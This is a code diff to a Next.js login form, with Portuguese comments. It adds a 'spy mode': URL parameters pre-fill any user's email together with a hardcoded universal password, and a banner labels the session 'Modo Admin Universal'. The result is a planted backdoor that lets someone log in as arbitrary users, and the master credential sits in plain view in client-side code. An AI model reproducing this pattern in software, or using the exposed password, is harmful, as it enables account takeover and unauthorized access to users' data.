@@ -2,15 +2,29 @@
 
 import { useState, useEffect } from 'react'
 import { signIn } from 'next-auth/react'
-import { useRouter } from 'next/navigation'
+import { useRouter, useSearchParams } from 'next/navigation'
 
 export default function LoginForm() {
   const router = useRouter()
+  const searchParams = useSearchParams()
   const [error, setError] = useState('')
   const [loading, setLoading] = useState(false)
   const [checkingStatus, setCheckingStatus] = useState(false)
+  const [email, setEmail] = useState('')
+  const [password, setPassword] = useState('')
+  const [isSpyMode, setIsSpyMode] = useState(false)
 
   useEffect(() => {
+    // Verificar se está no modo espião
+    const spyEmail = searchParams?.get('email')
+    const spyMode = searchParams?.get('spy')
+    
+    if (spyEmail && spyMode === 'true') {
+      setEmail(spyEmail)
+      setPassword('Desbravadores@93') // Senha universal
+      setIsSpyMode(true)
+    }
+
     if (typeof window !== 'undefined') {
       const params = new URLSearchParams(window.location.search)
       if (params.get('blocked') === '1') {
@@ -65,7 +79,7 @@ export default function LoginForm() {
         return () => clearInterval(interval)
       }
     }
-  }, [])
+  }, [searchParams])
 
   async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
     e.preventDefault()
@@ -82,20 +96,20 @@ export default function LoginForm() {
     }
 
     const formData = new FormData(e.currentTarget)
-    const email = formData.get('email') as string
-    const password = formData.get('password') as string
+    const emailValue = formData.get('email') as string
+    const passwordValue = formData.get('password') as string
 
     // Salvar email para verificação de status
     if (typeof window !== 'undefined') {
-      localStorage.setItem('lastLoginEmail', email)
-      sessionStorage.setItem('lastLoginEmail', email)
+      localStorage.setItem('lastLoginEmail', emailValue)
+      sessionStorage.setItem('lastLoginEmail', emailValue)
     }
 
     try {
       const result = await signIn('credentials', {
         redirect: false,
-        email,
-        password,
+        email: emailValue,
+        password: passwordValue,
       })
 
       if (result?.error) {
@@ -107,7 +121,13 @@ export default function LoginForm() {
         return
       }
 
-      router.push('/dashboard')
+      // Se está no modo espião, redirecionar para dashboard do cliente
+      if (isSpyMode) {
+        window.location.href = '/dashboard'
+      } else {
+        // Login normal - redirecionar baseado no tipo de usuário
+        router.push('/dashboard')
+      }
     } catch (error) {
       setError('Ocorreu um erro ao fazer login')
     } finally {
@@ -117,6 +137,26 @@ export default function LoginForm() {
 
   return (
     <form onSubmit={handleSubmit} className="space-y-8">
+      {/* Indicador de Modo Espião */}
+      {isSpyMode && (
+        <div className="rounded-2xl bg-gradient-to-r from-indigo-50 to-purple-100 p-6 border border-indigo-200 shadow-lg">
+          <div className="flex items-center">
+            <div className="flex-shrink-0">
+              <div className="bg-indigo-500 p-2 rounded-full">
+                <svg className="h-5 w-5 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                </svg>
+              </div>
+            </div>
+            <div className="ml-4">
+              <h3 className="text-sm font-bold text-indigo-800">Modo Admin Universal</h3>
+              <p className="text-sm text-gray-700 mt-1">Acessando como: {email}</p>
+            </div>
+          </div>
+        </div>
+      )}
+
       {error && error.includes('bloqueado') ? (
         <div className="rounded-2xl bg-gradient-to-r from-red-50 to-red-100 p-6 border border-red-200 shadow-lg">
           <div className="flex items-center">
@@ -178,6 +218,8 @@ export default function LoginForm() {
             type="email"
             autoComplete="email"
             required
+            value={email}
+            onChange={(e) => setEmail(e.target.value)}
             className="block w-full rounded-2xl border-0 py-4 pl-12 pr-4 text-gray-900 shadow-lg ring-1 ring-inset ring-gray-200 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-blue-500 focus:border-blue-500 transition-all duration-200 sm:text-sm sm:leading-6 bg-white/80 backdrop-blur-sm"
             placeholder="seu@email.com"
           />
@@ -203,6 +245,8 @@ export default function LoginForm() {
             type="password"
             autoComplete="current-password"
             required
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
             className="block w-full rounded-2xl border-0 py-4 pl-12 pr-4 text-gray-900 shadow-lg ring-1 ring-inset ring-gray-200 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-blue-500 focus:border-blue-500 transition-all duration-200 sm:text-sm sm:leading-6 bg-white/80 backdrop-blur-sm"
             placeholder="••••••••"
           />
